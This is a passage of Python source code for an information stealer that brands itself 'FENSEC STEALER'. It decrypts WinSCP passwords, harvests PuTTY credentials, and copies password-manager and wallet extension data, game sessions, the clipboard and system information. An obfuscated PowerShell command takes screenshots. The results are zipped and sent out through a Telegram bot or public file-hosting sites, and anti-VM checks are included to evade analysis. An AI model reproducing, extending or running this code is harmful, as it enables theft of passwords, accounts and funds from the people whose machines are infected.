                            session_path = f"{registry_path}\\{session_name}"
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path) as session_key:
                                hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
                                username = winreg.QueryValueEx(session_key, 'UserName')[0]
                                encrypted_password = winreg.QueryValueEx(session_key, 'Password')[0]
                                password = decrypt_winscp_password(hostname, username, encrypted_password)
                                output += f"Session  : {session_name}\nHostname : {hostname}\nUsername : {username}\nPassword : {password}\n---------------------------------------------------|\n"
                        except OSError:
                            break
                        index += 1
            except FileNotFoundError:
                return
            except Exception as Error:
                return
            
            if output:
                with open(output_path, 'w', encoding="utf-8", errors="ignore") as file:
                    file.write(output)

                if os.path.getsize(output_path) == 0:
                    os.remove(output_path)
                    folder_dirname = os.path.dirname(output_path)
                    if not os.listdir(folder_dirname):
                        os.rmdir(folder_dirname)

        except OSError as Error:
            logs_handler(f"[ERROR] - saving WinSCP files: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting WinSCP files: {str(Error)}")

    async def StealPutty(self, directory_path: str) -> None:
        async def parse_xml(xml_file: str) -> list:
            try:
                tree = ET.parse(xml_file)
                root = tree.getroot()
                pwd_found = []

                for connection in root.findall('connection'):
                    values = {}
                    for child in connection:
                        if child.tag in ['name', 'protocol', 'host', 'port', 'description', 'login', 'password']:
                            values[child.tag] = child.text

                    if values:
                        pwd_found.append(values)

                return pwd_found
            except ET.ParseError as Error:
                logs_handler(f"[ERROR] - parsing Putty XML: {str(Error)}")
                return []

        try:
            access_read = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
            key_path = 'Software\\ACS\\PuTTY Connection Manager'

            try:
                key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, access_read)
                this_name, _ = win32api.RegQueryValueEx(key, 'DefaultDatabase')
            except FileNotFoundError:
                return
            except Exception as Error:
                return
            
            full_path = os.path.join(directory_path, "FTP Clients", "Putty", str(this_name) if this_name else ' ')
            
            if os.path.exists(full_path):
                pwd_found = await parse_xml(full_path)
                output_file = os.path.join(directory_path, "FTP Clients", "Putty", 'putty_connections.txt')
                try:
                    with open(output_file, 'w') as file:
                        for entry in pwd_found:
                            for key, value in entry.items():
                                file.write(f"{key}: {value}\n")
                            file.write("\n")
                            
                    if os.path.getsize(output_file) == 0:
                        os.remove(output_file)
                        folder_dirname = os.path.dirname(output_file)
                        if not os.listdir(folder_dirname):
                            os.rmdir(folder_dirname)
                            
                except IOError as Error:
                    logs_handler(f"[ERROR] - saving Putty files: {str(Error)}")
            else:
                pass

        except Exception as Error:
            logs_handler(f"[ERROR] - An unexpected error occurred: {str(Error)}")



    async def StealPasswordManagers(self, directory_path: str) -> None:
        try:
            password_mgr_dirs = {
                "aeblfdkhhhdcdjpifhhbdiojplfjncoa": "1Password",
                "eiaeiblijfjekdanodkjadfinkhbfgcd": "NordPass",
                "fdjamakpfbbddfjaooikfcpapjohcfmg": "DashLane",
                "nngceckbapebfimnlniiiahkandclblb": "Bitwarden",
                "pnlccmojcmeohlpggmfnbbiapkmbliob": "RoboForm",
                "bfogiafebfohielmmehodmfbbebbbpei": "Keeper",
                "cnlhokffphohmfcddnibpohmkdfafdli": "MultiPassword",
                "oboonakemofpalcgghocfoadofidjkkk": "KeePassXC",
                "hdokiejnpimakedhajhdlcegeplioahd": "LastPass",
                "imloifkgjagghnncjkhggdhalmcnfklk": "Trezor",
            }

            password_dir_path = os.path.join(directory_path, "Password Managers")

            for browser_name, browser_path in self.browser_paths.items():
                if os.path.exists(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        if "Local Extension Settings" in dirs:
                            local_extensions_settings_dir = os.path.join(root, "Local Extension Settings")
                            for password_mgr_key, password_manager in password_mgr_dirs.items():
                                extension_path = os.path.join(local_extensions_settings_dir, password_mgr_key)
                                if os.path.exists(extension_path):
                                    password_mgr_browser = f"{password_manager} ({browser_name})"
                                    password_mgr_browser_path = os.path.join(password_dir_path, password_mgr_browser)
                                    os.makedirs(password_mgr_browser_path, exist_ok=True)

                                    if Path(extension_path).is_dir():
                                        shutil.copytree(Path(extension_path), password_mgr_browser_path, dirs_exist_ok=True)
                                    else:
                                        shutil.copy2(Path(extension_path), password_mgr_browser_path)

                                    location_file = os.path.join(password_mgr_browser_path, "Location.txt")
                                    with open(location_file, 'w') as loc_file:
                                        loc_file.write(f"Copied {password_manager} from {extension_path} to {password_mgr_browser_path}")

            if os.path.exists(password_dir_path) and not os.listdir(password_dir_path):
                os.rmdir(password_dir_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - getting passwords extensions: {str(Error)}")

    async def StealSteamUser(self) -> None:
        try:
            all_disks = []
            for drive in range(ord('A'), ord('Z') + 1):
                drive_letter = chr(drive)
                if os.path.exists(drive_letter + ':\\'):
                    all_disks.append(drive_letter)

            for steam_paths in all_disks:
                steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                if os.path.isfile(steam_paths):
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        steamid = "".join(re.findall(r"7656[0-9]{13}", file.read()))
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                url1 = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids={steamid}"
                                url2 = f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}"
                                url3 = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}&include_appinfo=true&include_played_free_games=true"

                                async with session.get(url1) as req:
                                    player_summary = await req.json()

                                async with session.get(url2) as req2:
                                    player_level = await req2.json()

                                async with session.get(url3) as req3:
                                    player_games = await req3.json()

                                player_data = player_summary["response"]["players"][0]
                                personname = player_data["personaname"]
                                profileurl = player_data["profileurl"]
                                timecreated = player_data["timecreated"]
                                creation_date = datetime.utcfromtimestamp(timecreated).strftime('%d-%m-%Y')

                                if player_data.get("realname"):
                                    realname = player_data["realname"]
                                else:
                                    realname = "None"

                                level = player_level["response"]["player_level"]
                                total_games = player_games["response"]["game_count"]

                                ListFonction.SteamUserAccounts.append(f"Real Name: {realname}\nPerson Name: {personname}\nProfile URL: {profileurl}\nCreation Date: {creation_date}\nPlayer Level: {level}\nTotal games: {total_games}\n")
                                
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Steam session: {str(Error)}")


    async def StealUbisoft(self, directory_path: str) -> None:
        try:
            ubisoft_path = os.path.join(self.localappdata, "Ubisoft Game Launcher")
            copied_path = os.path.join(directory_path, "Games", "Uplay")
            if os.path.isdir(ubisoft_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                for file in os.listdir(ubisoft_path):
                    name_of_files = os.path.join(ubisoft_path, file)
                    try:
                        shutil.copy(name_of_files, os.path.join(copied_path, file))
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Ubisoft files to logs: {str(Error)}")
                        pass
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Ubisoft files: {str(Error)}")
            pass

    async def StealEpicGames(self, directory_path: str) -> None:
        try:
            epic_path = os.path.join(self.localappdata, "EpicGamesLauncher", "Saved", "Config", "Windows")
            copied_path = os.path.join(directory_path, "Games", "Epic Games")
            if os.path.isdir(epic_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying EpicGames files to logs: {str(Error)}")
                    pass

        except Exception as Error:
            logs_handler(f"[ERROR] - getting EpicGames files: {str(Error)}")
            pass

    async def StealGrowtopia(self, directory_path: str) -> None:
        try:
            growtopia_path = os.path.join(self.localappdata, "Growtopia", "save.dat")
            copied_path = os.path.join(directory_path, "Games", "Growtopia")
            try:
                if os.path.isfile(growtopia_path):
                    shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
            except Exception as Error:
                logs_handler(f"[ERROR] - copying Growtopia files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Growtopia files: {str(Error)}")
            pass

    async def StealSteamFiles(self, directory_path: str) -> None:
        try:
            save_path = os.path.join(directory_path)
            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
            if os.path.isdir(steam_path):
                to_path = os.path.join(save_path, "Games", "Steam")
                try:
                    if not os.path.isdir(to_path):
                        os.mkdir(to_path)
                    shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Steam files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Steam files: {str(Error)}")
            return "null"
        
    

    async def StealBattleNet(self, directory_path) -> None:
        battle_net_path = os.path.join(self.appdata, 'Battle.net')
        if not os.path.exists(battle_net_path):
            return

        try:

            battle_path = os.path.join(directory_path, "Games", "Battle Net")
            os.makedirs(battle_path, exist_ok=True)

            for pattern in ["*.db", "*.config"]:
                for root, dirs, files in os.walk(battle_net_path):
                    for file in files:
                        if file.endswith(tuple(pattern.split("*"))):
                            try:
                                file_path = os.path.join(root, file)
                                if os.path.basename(root) == "Battle.net":
                                    destination_dir = directory_path
                                else:
                                    destination_dir = os.path.join(directory_path, os.path.basename(root))

                                os.makedirs(destination_dir, exist_ok=True)

                                shutil.copy(file_path, os.path.join(battle_path, file))
                            except Exception as Error:
                                logs_handler(f"[ERROR] - copying BattleNet files to logs: {str(Error)}")
                                return


        except Exception as Error:
            logs_handler(f"[ERROR] - getting BattleNet files: {str(Error)}")
            pass



    async def InsideFolder(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)

            if os.path.isdir(filePath):
                shutil.rmtree(filePath)

            os.makedirs(os.path.join(filePath, "Browsers"), exist_ok=True)
            os.makedirs(os.path.join(filePath, "Mozilla"), exist_ok=True)
            os.makedirs(os.path.join(filePath, "Computer"), exist_ok=True)
            os.makedirs(os.path.join(filePath, "Sessions"), exist_ok=True)
            os.makedirs(os.path.join(filePath, "Games"), exist_ok=True)

            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
            process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",cwd=filePath,shell=True)
            await process.communicate() 
                 

            if ListFonction.Historys:
                with open(os.path.join(filePath, "Browsers", "historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Historys:
                        file.write(value)
          
            if ListFonction.Autofills:
                with open(os.path.join(filePath, "Browsers", "autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Autofills:
                        file.write(value)

            if self.GeckoAutofiList:
                with open(os.path.join(filePath, "Mozilla", "autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in self.GeckoAutofiList:
                        file.write(value)
            if self.GeckoCookieList:
                with open(os.path.join(filePath, "Mozilla" "cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in self.GeckoCookieList:
                        file.write(value)
            if self.GeckoHistoryList:
                with open(os.path.join(filePath, "Mozilla", "historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in self.GeckoHistoryList:
                        file.write(value)   

            if ListFonction.SystemInfo:
                with open(os.path.join(filePath, "Computer", "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SystemInfo:
                        file.write(value)
            if ListFonction.ClipBoard:
                with open(os.path.join(filePath, "Computer", "clipboard_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.ClipBoard:
                        file.write(value)
            if ListFonction.Network:
                with open(os.path.join(filePath, "Computer", "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Network:
                        file.write(value)


            if ListFonction.SteamUserAccounts:
                with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SteamUserAccounts:
                        file.write(value)

            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Browsers"))
                except:pass

            if len(os.listdir(os.path.join(filePath, "Mozilla"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Mozilla"))
                except:pass

            if len(os.listdir(os.path.join(filePath, "Computer"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Computer"))
                except:pass

            if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Sessions"))
                except:pass
            

            tasks = [
                self.StealWallets(filePath),
                self.InjectWallets(),
                self.StealTelegramSession(filePath),
                self.StealWhatsApp(filePath),
                self.StealSignal(filePath),
                self.StealSkype(filePath),
                self.StealElement(filePath),
                self.StealPidgin(filePath),
                self.StealTox(filePath),
                self.StealViber(filePath),
                self.StealProtonVPN(filePath),
                self.StealOpenVPN(filePath),
                self.StealSurfsharkVPN(filePath),
                self.StealFileZilla(filePath),
                self.StealWinSCP(filePath),
                self.StealPutty(filePath),
                self.BackupMailbird(filePath),
                self.BackupThunderbird(filePath),
                self.StealPasswordManagers(filePath),
                self.StealUbisoft(filePath),
                self.StealEpicGames(filePath),
                self.StealGrowtopia(filePath),
                self.StealSteamFiles(filePath),
                self.StealBattleNet(filePath),
            ]
            
            await asyncio.gather(*tasks)

            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games", "Password Managers"]
            if not os.path.exists(filePath):
                return

            for root, dirs, files in os.walk(filePath, topdown=False):
                for dir_name in dirs:
                    if dir_name in folders_to_check:
                        dir_path = os.path.join(root, dir_name)
                        if not os.listdir(dir_path):
                            shutil.rmtree(dir_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - sending all data to the logs folder: {str(Error)}")

    async def SendAllData(self) -> None:
        try:
            hostname = platform.node()
            filePath = os.path.join(self.temp, hostname)
            shutil.make_archive(filePath, "zip", filePath)
            
            system_info = platform.uname()
            ip_info = requests.get("https://ipinfo.io/json").json()

            text = f"""
<b>👤  <i><u>{hostname.upper()} - FENSEC STEALER</u></i></b>

<b>⚙️  <i><u>System Informations</u></i></b>
<b>💻 Computer Host:</b> <code>{system_info.node}</code>
<b>🔌 Computer OS:</b> <code>{system_info.system} {system_info.release} {system_info.version}</code>
<b>🔋 CPU:</b> <code>{system_info.processor}</code>

<b>🌐  <i><u>Network Informations</u></i></b>
<b>🎯 IP Address:</b> <code>{ip_info.get("ip", "N/A")}</code>
<b>⛰ Region:</b> <code>{ip_info.get("region", "N/A")}</code>
<b>📍 Country:</b> <code>{ip_info.get("country", "N/A")}</code>

🔮 <code>https://t.me/fensecstealer</code>
"""

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    if response.status != 200:
                        raise Exception(f"[ERROR] - sending all information embed to telegram: {await response.text()}")

                if os.path.getsize(filePath + ".zip") / (1024 * 1024) <= 15:
                    send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                    form = aiohttp.FormData()
                    form.add_field('chat_id', CHAT_ID)
                    form.add_field('document', open(filePath + ".zip", 'rb'), filename=f"{hostname}.zip")
                    async with session.post(send_document_url, data=form) as response:
                        if response.status != 200:
                            logs_handler(f"[ERROR] - sending logs zip file to telegram: {await response.text()}")
                else:
                    file_url = await UploadFiles.upload_file(filePath + ".zip")
                    if file_url is not None:
                        text = f"<b>📥  <i><u>{platform.node().upper()} - FENSEC STEALER</u></i></b>\n\n<b>⛓️  File Link:</b> {file_url}"
                        message_payload['text'] = text
                        async with session.post(send, data=message_payload) as response:
                            if response.status != 200:
                                logs_handler(f"[ERROR] - sending file link message to telegram: {await response.text()}")
                                raise Exception(f"[ERROR]")
                    else:
                        text = "<b>📥 Can't Send Logs</b>"
                        message_payload['text'] = text
                        async with session.post(send, data=message_payload) as response:
                            if response.status != 200:
                                logs_handler(f"[ERROR] - sending message to telegram: {await response.text()}")
                                raise Exception(f"[ERROR]")
                try:
                    os.remove(filePath + ".zip")
                    shutil.rmtree(filePath)
                except Exception as Error:
                    logs_handler(f"[ERROR] - removing logs zip file: {str(Error)}")

        except Exception as Error:
            logs_handler(f"[ERROR] - sending all data: {str(Error)}")

            

class UploadFiles:
    @staticmethod
    async def getserver() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception as Error:
            logs_handler(f"[ERROR] - connecting to gofile server: {str(Error)}")
            return "store1"

    @staticmethod
    async def upload_gofile(path: str) -> str:
        try:
            server = await UploadFiles.getserver()
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                        data = await response.json()
                        if response.status == 200 and "data" in data:
                            return data["data"]["downloadPage"]
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to gofile: {str(Error)}")
            return None

    @staticmethod
    async def upload_catbox(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
                    form.add_field('reqtype', 'fileupload')
                    form.add_field('userhash', '')
                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                        result = await response.text()
                        if "catbox.moe" in result:
                            return result
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to catbox: {str(Error)}")
            return None

    @staticmethod
    async def upload_fileio(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://file.io/', data=form) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("link")
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to fileio: {str(Error)}")
            return None

    @staticmethod
    async def upload_uguu(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                        data = await response.json()
                        if "url" in data:
                            return data.get("url")
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to uguu: {str(Error)}")
            return None

    @staticmethod
    async def upload_krakenfiles(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://krakenfiles.com/api/v1/file/upload', data=form) as response:
                        data = await response.json()
                        if "data" in data and "file" in data["data"]:
                            return data["data"]["file"]["url"]
                        else:
                            return None
        except Exception as Error:
            logs_handler(f"[ERROR] - uploading to kraken: {str(Error)}")
            return None

    @staticmethod
    async def upload_file(file_path: str) -> str:
        upload_attempts = [
            ('GoFile', UploadFiles.upload_gofile),
            ('Catbox', UploadFiles.upload_catbox),
            ('File.io', UploadFiles.upload_fileio),
            ('Uguu', UploadFiles.upload_uguu),
            ('KrakenFiles', UploadFiles.upload_krakenfiles),
        ]
        
        for platform, upload_method in upload_attempts:
            try:
                result = await upload_method(file_path)
                if result:
                    return result
            except Exception as Error:
                logs_handler(f"[ERROR] - uploading to {platform.capitalize()}: {str(Error)}")
                continue
        
        return "All upload attempts failed."

class InfoStealer:
    def __init__(self):
        self.loop = asyncio.get_event_loop()

    async def run_all_fonctions(self):
        await asyncio.gather(
            self.StealLastClipBoard(),
            self.StealNetworkInformation(),
            self.StealSystemInfo()
        )
    
    async def get_command_output(self, command: str) -> str:
        process = await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
        stdout, stderr = await process.communicate()
        if stderr:
            logs_handler(f"[ERROR] - running commands")
        return stdout.decode(errors="ignore")

    async def StealLastClipBoard(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Clipboard")
            if output:
                ListFonction.ClipBoard.append(output)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting clipboard informations: {str(Error)}")

    async def StealNetworkInformation(self) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data["query"]
                    country = data["country"]
                    city = data["city"]
                    timezone = data["timezone"]
                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
                    ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting network informations: {str(Error)}")

    async def StealSystemInfo(self) -> None:
        try:
            command = r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername'
            output = await self.get_command_output(command)
            ListFonction.SystemInfo.append(output)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting system informations: {str(Error)}")
            pass

class anti_vm:
    async def run_all_fonctions(self) -> None:
        tasks = [
            asyncio.create_task(self.check_disk_space()),
            asyncio.create_task(self.check_recent_files()),
            asyncio.create_task(self.check_process_count()),
            asyncio.create_task(self.check_virtual_memory()),
            asyncio.create_task(self.check_for_virtualization()),
            asyncio.create_task(self.check_for_suspicious_files()),
            asyncio.create_task(self.check_system_manufacturer())
        ]
        try:
            await asyncio.gather(*tasks)
        except Exception as Error:
            logs_handler(f"[ERROR] - run all anti_vm fonctions: {str(Error)}")

    async def check_disk_space(self) -> bool:
        try:
            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
            if total_disk_space_gb < 50:
                ctypes.windll.kernel32.ExitProcess(0)
            min_disk_space_gb = 50
            if len(sys.argv) > 1:
                min_disk_space_gb = float(sys.argv[1])
            free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
            if free_space_gb < min_disk_space_gb:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - suspicious disk space detected: {str(Error)}")

    async def check_recent_files(self) -> bool:
        try:
            recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
            if len(os.listdir(recent_files_folder)) < 20:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - recent files detected: {str(Error)}")

    async def check_process_count(self) -> None:
        try:
            if len(psutil.pids()) < 50:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - suspicious process detected: {str(Error)}")

    async def check_virtual_memory(self) -> None:
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_memory_gb < 6:
